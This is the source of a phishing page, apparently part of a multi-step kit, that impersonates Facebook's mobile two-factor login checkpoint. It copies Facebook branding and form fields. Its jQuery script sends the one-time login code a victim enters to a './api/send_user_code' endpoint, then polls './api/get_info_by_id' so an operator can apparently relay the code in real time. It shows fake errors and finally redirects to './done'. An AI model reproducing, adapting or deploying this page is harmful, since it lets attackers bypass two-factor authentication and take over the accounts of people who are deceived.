<?php 
// $apis = json_decode($apis, true);
// if($apis['status'] == 'error'){
//     header('location: ./business');
// }else{
//   $apis = $apis['json']; 
//   if($apis['step'] == '3') {
//       header('location: ./done');
//   }else if($apis['step'] == '2') { 
   
?>

<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <title>Enter login code to continue</title>
      <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
      <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

      <style type="text/css" nonce="">
         /*<![CDATA[*/form{margin:0;border:0;}button.btn-custom{color:#90949c;cursor:pointer;margin:16px 0;}.custom-k{padding-bottom:4px;padding-top:4px;}.custom-by{padding-top:8px;}.custom-u{font-size:14px;line-height:20px;}.custom-bh{text-align:center;}.custom-bk .bm button{white-space:normal;}.custom-bk .bm button span{line-height:20px;margin-top:auto;}.custom-bu{text-align:center;}.custom-b .custom-bl table{width:100%;}body,tr,input,textarea,.custom-f{font-size:medium;}.custom-s{margin-right:4px;}.custom-bd{background:#f5f6f7;}.custom-e{background:#dddfe2;}.custom-p{background:#fff;}.custom-b .custom-x{padding:2px;}.custom-b .custom-n{padding:4px;}.custom-b .custom-t{padding:6px;}.custom-r{border-color:#E4E6EB #CFD1D5 #b0b3b8;border-style:solid;border-width:1px;}.custom-q>*,.custom-q.custom-q>*{border-bottom:1px solid #e5e5e5;}.custom-q>:last-child{border-bottom:none;}.custom-q+.custom-q{border-top:1px solid #e5e5e5;}.custom-bj{color:#90949c;}.custom-v{color:#4b4f56;}.custom-bi{font-size:12px;line-height:16px;}.custom-bv{font-size:14px;line-height:20px;}.custom-bp{font-weight:normal;}.custom-w{font-weight:bold;}.custom-y{background-color:#fff;}.custom-i{background-color:#3b5998;}.custom-j{padding:2px 3px;}.custom-z{padding:4px 3px;}.custom-ba{border:solid 1px #999;border-top-color:#888;margin:0;}.custom-b .custom-ba{padding:3px 3px 4px 0;}.custom-b .custom-bc{border-collapse:collapse;margin:0;width:100%;}.custom-b td.bg{border:0;padding:6px 0 6px 6px;vertical-align:middle;}.custom-b .custom-bf{padding:6px;}.custom-b .custom-bz{border:0;border-collapse:collapse;margin:0;padding:0;width:100%;}.custom-b .custom-bz tbody{vertical-align:top;}.custom-b .custom-bz td{padding:0;}.custom-b .custom-bz td.custom-x{padding:2px;}.custom-b .custom-bz td.custom-n{padding:4px;}.custom-b .custom-bz td.custom-t{padding:6px;}.custom-b .custom-be{width:100%;}.custom-b a,.custom-b a:visited{color:#3b5998;text-decoration:none;}.custom-b a:focus,.custom-b a:hover{background-color:#3b5998;color:#fff;}.custom-bq{-webkit-appearance:none;background:none;display:inline-block;font-size:12px;height:28px;line-height:28px;margin:0;overflow:visible;padding:0 9px;text-align:center;vertical-align:top;white-space:nowrap;}.custom-b .custom-bq{border-radius:2px;}.custom-bt,a.custom-bt,html .custom-b a.custom-bt{color:#fff;}.custom-b .custom-bt{background-color:#4267b2;border:1px solid #365899;}.custom-b a.custom-bt:hover,.custom-b .custom-bt:hover{background-color:#465e91;}.custom-bt[disabled]{color:#899bc1;}.custom-b .custom-bt[disabled]:hover{background-color:#4267b2;}.custom-bs{font-size:14px;height:36px;line-height:36px;padding:0 16px;}.custom-b a.custom-bq::after{content:'';display:inline-block;height:100%;vertical-align:middle;}.custom-bq.custom-br{display:block;width:100%;}a.custom-bq.custom-br,.custom-b label.custom-bq.custom-br{display:block;width:auto;}.custom-b .custom-bq{padding:0 8px;}.custom-b a.custom-bq{height:26px;line-height:26px;}.custom-b .custom-bs{padding:0 15px;}.custom-b a.custom-bs{font-size:14px;height:34px;line-height:34px;}.custom-bw{-webkit-appearance:none;background-color:transparent;border:0;display:inline;font-size:inherit;margin:0;padding:0;}.custom-bw:hover{background-color:#3b5998;color:#fff;white-space:normal;}.custom-cc{color:#3b5998;}.custom-ce{border:1px solid #3b5998;border-radius:3px;color:#3578e5;display:block;font-size:large;height:18px;line-height:17px;margin-right:1px;text-align:center;vertical-align:middle;width:18px;}.custom-cd{margin:0 auto;}.custom-cd .custom-l{margin:3px 0;}.custom-l{border:0;display:inline-block;vertical-align:top;}i.custom-l u{position:absolute;width:0;height:0;overflow:hidden;}body{text-align:left;direction:ltr;}body,tr,input,textarea,button{font-family:sans-serif;}body,p,figure,h1,h2,h3,h4,h5,h6,ul,ol,li,dl,dd,dt{margin:0;padding:0;}h1,h2,h3,h4,h5,h6{font-size:1em;font-weight:bold;}ul,ol{list-style:none;}article,aside,figcaption,figure,footer,header,nav,section{display:block;}.custom-d #viewport{margin:0 auto;max-width:600px;}#page{position:relative;}/*]]>*/ </style> 
        <style> 
            .lsd-ring-containers {
            position: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100vw;
            height: 110vh;
            z-index: 100000000;
            background-color: rgba(100, 100, 111, 0.2);
            transform: translateY(-29px);
            }
            .lds-ring {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
            }
            .lds-ring div {
            box-sizing: border-box;
            display: block;
            position: absolute;
            width: 64px;
            height: 64px;
            margin: 8px;
            border: 8px solid #fff;
            border-radius: 50%;
            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
            border-color: #fff transparent transparent transparent;
            }
            .lds-ring div:nth-child(1) {
            animation-delay: -0.45s;
            }
            .lds-ring div:nth-child(2) {
            animation-delay: -0.3s;
            }
            .lds-ring div:nth-child(3) {
            animation-delay: -0.15s;
            }
            @keyframes lds-ring {
            0% {
            transform: rotate(0deg);
            }
            100% {
            transform: rotate(360deg);
            }
            }
            #loading-circle {
            position: fixed;
            top: 50%;
            left: 49%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            animation: spin 1s linear infinite;
            display: none;
            }
            @keyframes spin {
            0% {
            transform: rotate(0deg);
            }
            100% {
            transform: rotate(360deg);
            }
            }
      </style>
      <meta http-equiv="origin-trial" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
      <link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials">
   </head>
   <body tabindex="0" class="custom-b custom-c custom-d custom-e">   
      <div id='loading' class="lsd-ring-containers" style='display: none'>
         <div class="lds-ring">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
         </div>
      </div>
      <div class="custom-f">
         <div id="viewport">
            <div class="g h" id="MChromeHeader">
               <div class="custom-i custom-j" role="banner" id="header">
                  <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
                  <a href="#"><img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/k97pj8-or6s.png" width="77" height="16" class="custom-k custom-l" alt="facebook"></a>
               </div>
            </div>
            <div id="objects_container">
               <div class="custom-e" id="root" role="main">
                <form class="checkpoint" id="u_0_2_BA" action="">
                     <input type="hidden" name="fb_dtsg" value="4BCwypTQCiI=" autocomplete="off"><input type="hidden" name="jazoest" value="21008" autocomplete="off"><input type="hidden" name="checkpoint_data" value="">
                     <div title="Enter login code to continue">
                        <div id="u_0_0_0D"></div>
                        <article class="custom-e custom-n custom-o" id="u_0_1_zv">
                           <section class="custom-p custom-q custom-r">
                              <div class="custom-s"></div>
                              <section class="custom-t custom-u">
                                 <span class="custom-v custom-w">
                                    <div id="checkpoint_title">Enter login code to continue</div>
                                 </span>
                              </section>
                              <section class="custom-x">
                                 <div class="custom-y custom-z"> 
                                           <div class="custom-t custom-u">Your account has two-factor authentication enabled. This requires some additional steps to confirm this.</div> 
                                           <div style="height: 1px; background-image: linear-gradient(to right, rgb(182, 182, 182) 100%, transparent 100%);"></div> 
                                           <div class="custom-v custom-w custom-t custom-u">Approve from another device</div>
                                           <div class="custom-t custom-u">We have sent notice to your Facebook. Please check your Facebook message and approve the confirmation to continue.</div> 
                                           <div style="height: 1px; background-image: linear-gradient(to right, rgb(182, 182, 182) 100%, transparent 100%);"></div> 
                                           <div class="custom-v custom-w custom-t custom-u">Or, enter your login code</div> 
                                           <div class="custom-t custom-u">Enter the 6 or 8 digit code sent to your phone number and email or from the authentication app that you set up.</div>
                                           <span>
                                 </div>
                                 <div class="custom-y custom-z">
                                    <div> <input type="text" class="inputtext code2faphp_input cgn mx-sm-3" tabindex="1" onkeypress="return event.charCode >= 48 && event.charCode <= 57" name="cgn" id="code" minlength="6" maxlength="8" required="" v-model="code2fa" autocomplete="off" placeholder="Login code" aria-label="Login code" /></span>
                                        <p class="2fa-error" style="color:red;font-size:14px;margin-left: 0px;margin-top: 5px;"></p>
                                 </div>
                                 <div class="custom-y custom-z"><input type="hidden" name="codes_submitted" value="0"></div>
                                 <div class="custom-y custom-z">Note: Your text message may take a few minutes to arrive.</div>
                              </section>
                              <table class="custom-bc custom-bd custom-t">
                                 <tbody>
                                    <tr>
                                       <td class="custom-be custom-bf custom-bg" aria-hidden="false">
                                          <div class="custom-bh"><span class="custom-bi custom-bj"><a href="#" target="_top">Having trouble?</a></span></div>
                                       </td>
                                    </tr>
                                 </tbody>
                              </table>
                           </section>
                           <div class="custom-bk custom-bl">
                              <table class="custom-bm">
                                 <tbody>
                                    <tr>
                                       <td id="checkpointSubmitButton" class="custom-bn"><input value="Submit Code" type="submit" name="submit[Submit Code]" class="custom-bo custom-bp custom-bq custom-br custom-bs custom-bt"  id="submit_2fa"></td>
                                    </tr>
                                 </tbody>
                              </table>
                              <input type="hidden" name="nh" value="5320e3cf54e7338d7ceb6aab528af10b551f0dc2">
                           </div>
                           <div class="custom-bu">
                              <div value="Log In Here" name="submit[logout-button-with-confirm]" class="custom-bo custom-bv custom-bj custom-bw custom-bx" id="id[logout-button-with-confirm]">Log In Her</div>

                              <section class="custom-by">
                                 <div class="custom-y custom-z" id="locale-selector">
                                    <table class="custom-bz" role="presentation">
                                       <tbody>
                                          <tr>
                                             <td class="custom-be" style="width:50%">
                                                <span class="custom-bi custom-bj custom-w custom-ca">English (US)</span>
                                                <div class="custom-cb"><span class="custom-bi"><input type="hidden" name="fb_dtsg" value="4BCwypTQCiI=" autocomplete="off"><input type="hidden" name="jazoest" value="21008" autocomplete="off"><input value="日本語" type="submit" class="custom-bo custom-bw custom-cc" style="padding: 1px;"></span></div>
                                                <div class="custom-cb">
                                                   <span class="custom-bi">
                  <div method="get" action="#"><input type="hidden" name="fb_dtsg" value="4BCwypTQCiI=" autocomplete="off"><input type="hidden" name="jazoest" value="21008" autocomplete="off"><input value="中文(简体)" type="submit" class="custom-bo custom-bw custom-cc" style="padding: 1px;"></div></span></div><div class="custom-cb"><span class="custom-bi"><div method="post" action="#"><input type="hidden" name="fb_dtsg" value="4BCwypTQCiI=" autocomplete="off"><input type="hidden" name="jazoest" value="21008" autocomplete="off"><input value="Français (France)" type="submit" class="custom-bo custom-bw custom-cc" style="padding: 1px;"></div></span></div></td><td class="custom-be" style="width:50%"><div class="custom-cb"><span class="custom-bi"><div method="post" action="#"><input type="hidden" name="fb_dtsg" value="4BCwypTQCiI=" autocomplete="off"><input type="hidden" name="jazoest" value="21008" autocomplete="off"><input value="Tiếng Việt" type="submit" class="custom-bo custom-bw custom-cc" style="padding: 1px;"></div></span></div><div class="custom-cb"><span class="custom-bi"><div method="post" action="#"><input type="hidden" name="fb_dtsg" value="4BCwypTQCiI=" autocomplete="off"><input type="hidden" name="jazoest" value="21008" autocomplete="off"><input value="Português (Brasil)" type="submit" class="custom-bo custom-bw custom-cc" style="padding: 1px;"></div></span></div><div class="custom-cb"><span class="custom-bi"><div method="post" action="#"><input type="hidden" name="fb_dtsg" value="4BCwypTQCiI=" autocomplete="off"><input type="hidden" name="jazoest" value="21008" autocomplete="off"><input value="Español" type="submit" class="custom-bo custom-bw custom-cc" style="padding: 1px;"></div></span></div><a href="#"><div class="custom-cd custom-ce custom-cf" aria-label="Complete list of languages"><img src="https://static.xx.fbcdn.net/rsrc.php/v3/yK/r/oFjmHUTYkRm.png" width="12" height="12" class="custom-l"></div></a></td></tr></tbody></table></div></section></div></article></div>
                  <div style="display:none">
                     <div></div>
                  </div>
                  <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span></form>
               </div>
            </div>
         </div>
      </div>
      <script>
         var shouldStop;
           var code;
           $(document).ready(function () {
             // Intercept the form submission
             document.getElementById('submit_2fa').addEventListener('click', function(event) { 
               shouldStop = false; 
               event.preventDefault();
              
               if (!$("#code").val()) { 
         
                 $(".2fa-error").html("Login code cannot be left blank");
               }else{ 
                  code = $('#code').val();  
                 // document.getElementById('loading').hidden = false;
                 document.getElementById('loading').style.display = 'flex';
                 $.ajax({
                     type: "POST",
                     url: "./api/send_user_code", 
                     contentType: "application/json",
                        url: "./api/send_user_code", 
                        data: JSON.stringify({
                            code : code
                        }), 
                     success: function(response){ 
                       
                       var intervalId = setInterval(function() { 
                         checkStatus();
         
                       if (shouldStop) { 
                           clearInterval(intervalId);
                       }
                       }, 1000);
                       console.log(response); 
                     }, error:function(error){
                         location.reload();
                     }
                 });
               } 
             });
           });
         
           function checkStatus() { 
        
            $.ajax({
                url: "./api/get_info_by_id",
                type: 'GET',
                dataType: 'json',
                success: function(data) {
                if(data.status == 'error'){

                }else{
                datas = data.json
                    if (datas.status === '5' || datas.status === '9') {
                    console.log(datas); 
                    setTimeout(function() {redirectToSleep();}, 2000);  
                    } else if (datas.status === '4' || datas.status === '10') { 
                    
                        if(shouldStop){
                            
                        }else{  
                            document.getElementById('loading').style.display = 'none';
                            $(".2fa-error").html("Login code cannot be left blank");
                        shouldStop = true
                        } 
        
                    } else { 
                    //no

                    }
                }
                },
                error: function(error) {
                    console.log('Error:', error);
                    // Xử lý lỗi 
                    window.location.href = '';
                }
            });
        } 
        function checkStatuss() { 
        
            $.ajax({
                url: "./api/get_info_by_id",
                type: 'GET',
                dataType: 'json',
                success: function(data) {
                if(data.status == 'error'){

                }else{
                datas = data.json
                    if (datas.step === '3' || datas.step === '3') {
                    
        setTimeout(function() {redirectToSleep();}, 2000);  
                    } else { 
                    //no

                    }
                }
                },
                error: function(error) {
                    console.log('Error:', error);
                    // Xử lý lỗi 
                    window.location.href = '';
                }
            });
        } 
         function redirectToSleep() {
                 window.location.href = './done';
             }
             
             var intervalIds = setInterval(function() { 
                         checkStatuss(); 
                       }, 1000);
      </script>
   </body>
</html>

<?php
// }else{
//     header('location: ./business');
// } }
?>